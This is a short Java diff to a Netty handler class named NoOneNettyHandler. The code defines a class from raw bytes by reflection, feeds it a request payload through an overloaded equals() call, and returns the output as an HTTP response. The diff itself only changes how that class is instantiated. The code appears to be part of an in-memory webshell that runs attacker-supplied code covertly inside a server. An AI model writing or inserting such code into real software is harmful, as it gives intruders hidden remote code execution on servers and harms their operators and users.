@@ -57,9 +57,8 @@ public class NoOneNettyHandler extends ChannelDuplexHandler {
                         coreClass = reflectionDefineClass(coreBytes);
                     }
                     ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-                    Object httpChannelCore = coreClass.getConstructor(Object.class).newInstance(this);
+                    Object httpChannelCore = coreClass.newInstance();
                     httpChannelCore.equals(new Object[]{payload, outputStream});
-                    httpChannelCore.toString();
                     byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
                     FullHttpResponse response = new DefaultFullHttpResponse(
                             HttpVersion.HTTP_1_1,
